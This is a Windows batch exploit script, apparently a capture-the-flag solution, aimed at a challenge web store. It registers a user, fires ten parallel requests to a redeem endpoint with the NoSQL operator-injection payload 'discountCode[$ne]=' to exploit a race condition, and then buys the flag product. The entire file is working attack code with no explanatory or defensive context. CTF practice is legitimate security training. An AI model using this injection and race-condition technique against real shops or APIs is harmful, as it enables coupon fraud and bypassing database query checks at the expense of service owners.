@echo off
REM Register user
curl.exe -s -c c:\tmp\c.txt -H "Content-Type: application/json" -d "{\"username\":\"u%RANDOM%\",\"password\":\"pass123\"}" http://chall_citadel.cryptonitemit.in:62014/register-user
echo.
echo ===== Registration complete =====
echo.

REM Run 10 parallel redeem requests
echo Running redeem requests...
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem
start /B curl.exe -s -b c:\tmp\c.txt -G --data-urlencode "discountCode[$ne]=" http://chall_citadel.cryptonitemit.in:62014/redeem

REM Wait for background processes
timeout /t 5 /nobreak >nul

echo.
echo  Redeem requests complete 
echo.

REM Purchase the flag
echo Purchasing flag...
curl.exe -s -b c:\tmp\c.txt -H "Content-Type: application/json" -d "{\"productId\":4}" http://chall_citadel.cryptonitemit.in:62014/store
echo.
